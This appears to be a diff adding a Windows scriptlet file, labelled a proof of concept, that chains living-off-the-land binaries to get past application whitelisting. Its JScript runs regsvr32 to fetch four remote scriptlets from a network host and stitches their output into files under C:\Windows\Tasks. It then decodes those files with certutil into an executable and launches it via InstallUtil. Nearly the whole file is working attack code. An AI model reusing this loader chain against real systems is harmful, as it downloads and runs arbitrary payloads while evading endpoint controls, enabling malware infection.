@@ -1,0 +1,68 @@
+<?XML version="1.0"?>
+<scriptlet>
+<registration 
+    progid="PoC"
+    classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
+	<!-- Proof Of Concept - Casey Smith @subTee -->
+	<!--  License: BSD3-Clause -->
+	<script language="JScript">
+		<![CDATA[
+		
+			var fsoForReading = 1;
+			var fsoForWriting = 2;
+			// Reference MSDN https://msdn.microsoft.com/en-us/library/aa265347(v=vs.60).aspx
+			
+			function sleep(delay) 
+			{
+				var start = new Date().getTime();
+				while (new Date().getTime() < start + delay);
+			}
+			
+			function LoadStringFromFile(filename)
+			{
+				var fso, f, data;
+				fso = new ActiveXObject("Scripting.FileSystemObject");
+				f = fso.OpenTextFile(filename, fsoForReading, true); 
+				data = f.ReadAll();
+				f.Close();
+				return data;
+			}
+
+			function SaveStringToFile(filename, textString)
+			{
+				var fso, f;
+				fso = new ActiveXObject("Scripting.FileSystemObject");
+				f = fso.OpenTextFile(filename, fsoForWriting, true); 
+				f.Write(textString);
+				f.Close();
+			}
+
+			var r1 = new ActiveXObject("WScript.Shell").Run("regsvr32.exe /s /u /i:http://192.168.152.137/slave1.sct scrobj.dll");
+			var r2 = new ActiveXObject("WScript.Shell").Run("regsvr32.exe /s /u /i:http://192.168.152.137/slave2.sct scrobj.dll");
+			var r3 = new ActiveXObject("WScript.Shell").Run("regsvr32.exe /s /u /i:http://192.168.152.137/slave3.sct scrobj.dll");
+			var r4 = new ActiveXObject("WScript.Shell").Run("regsvr32.exe /s /u /i:http://192.168.152.137/slave4.sct scrobj.dll");
+
+			sleep(10000);
+			var file = ""
+			var fso, f;
+			fso = new ActiveXObject("Scripting.FileSystemObject");
+			f = fso.OpenTextFile("C:\\Windows\\Tasks\\Bypass.txt", fsoForWriting, true); 
+			file = LoadStringFromFile("C:\\Windows\\Tasks\\Bypass1.txt")
+			f.Write(file);
+			file = LoadStringFromFile("C:\\Windows\\Tasks\\Bypass2.txt")
+			f.Write(file);
+			file = LoadStringFromFile("C:\\Windows\\Tasks\\Bypass3.txt")
+			f.Write(file);
+			file = LoadStringFromFile("C:\\Windows\\Tasks\\Bypass4.txt")
+			f.Write(file);
+			f.Close();
+
+			sleep(5000);
+			var r5 = new ActiveXObject("WScript.Shell").Run("certutil.exe /decode C:\\Windows\\Tasks\\Bypass.txt C:\\Windows\\Tasks\\x64.exe", 0);
+			sleep(5000);
+			var execFilex64 = new ActiveXObject("WScript.Shell").Run("C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Windows\\Tasks\\x64.exe", 0);
+
+		]]>
+</script>
+</registration>
+</scriptlet>
